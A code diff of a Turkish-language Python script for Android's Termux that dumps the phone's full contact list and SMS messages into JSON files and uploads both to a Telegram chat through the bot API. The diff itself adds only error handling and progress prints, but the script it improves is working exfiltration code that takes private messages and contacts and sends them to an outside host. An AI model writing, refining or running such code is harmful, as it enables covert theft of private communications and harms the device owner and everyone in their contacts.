@@ -14,6 +14,7 @@ def rehber_cal():
         rehber = subprocess.check_output("termux-contact-list", shell=True).decode()
         return json.loads(rehber)
     except Exception as e:
+        print(f"Rehber çekerken hata: {str(e)}")
         return {"hata": f"Rehber alınamadı, lanet olsun: {str(e)}"}
 
 def sms_cal():
@@ -21,6 +22,7 @@ def sms_cal():
         smsler = subprocess.check_output("termux-sms-list", shell=True).decode()
         return json.loads(smsler)
     except Exception as e:
+        print(f"SMS çekerken hata: {str(e)}")
         return {"hata": f"SMS'ler alınamadı, naber: {str(e)}"}
 
 def bilgileri_kaydet_ve_gonder():
@@ -33,9 +35,13 @@ def bilgileri_kaydet_ve_gonder():
     for i, kisi in enumerate(rehber_listesi, 1):
         rehber_verileri.append({f"[{i}]": kisi})
     
-    with open(rehber_dosyasi, "w") as f:
-        json.dump(rehber_verileri, f, indent=4, ensure_ascii=False)
-    print(f"Rehber {rehber_dosyasi} dosyasına kaydedildi, kral!")
+    try:
+        with open(rehber_dosyasi, "w") as f:
+            json.dump(rehber_verileri, f, indent=4, ensure_ascii=False)
+        print(f"Rehber {rehber_dosyasi} dosyasına kaydedildi, kral!")
+    except Exception as e:
+        print(f"Rehber kaydetme hatası: {str(e)}")
+        return
 
     # SMS'leri al ve kaydet
     sms_listesi = sms_cal()
@@ -44,19 +50,27 @@ def bilgileri_kaydet_ve_gonder():
     for i, sms in enumerate(sms_listesi, 1):
         sms_verileri.append({f"[{i}]": sms})
     
-    with open(sms_dosyasi, "w") as f:
-        json.dump(sms_verileri, f, indent=4, ensure_ascii=False)
-    print(f"SMS'ler {sms_dosyasi} dosyasına kaydedildi, kral!")
+    try:
+        with open(sms_dosyasi, "w") as f:
+            json.dump(sms_verileri, f, indent=4, ensure_ascii=False)
+        print(f"SMS'ler {sms_dosyasi} dosyasına kaydedildi, kral!")
+    except Exception as e:
+        print(f"SMS kaydetme hatası: {str(e)}")
+        return
 
     # Telegram'a gönder
     try:
+        print("Telegram'a rehber gönderiliyor...")
         with open(rehber_dosyasi, "rb") as f:
-            requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
-        print(f"{rehber_dosyasi} Telegram'a gönderildi, kral!")
+            response = requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
+            response.raise_for_status()  # Hata varsa fırlat
+        print(f"{rehber_dosyasi} Telegram'a gönderildi, kral! Yanıt: {response.text}")
         
+        print("Telegram'a SMS gönderiliyor...")
         with open(sms_dosyasi, "rb") as f:
-            requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
-        print(f"{sms_dosyasi} Telegram'a gönderildi, kral!")
+            response = requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
+            response.raise_for_status()
+        print(f"{sms_dosyasi} Telegram'a gönderildi, kral! Yanıt: {response.text}")
     except Exception as e:
         print(f"Telegram'a gönderilemedi, lanet: {str(e)}")
 
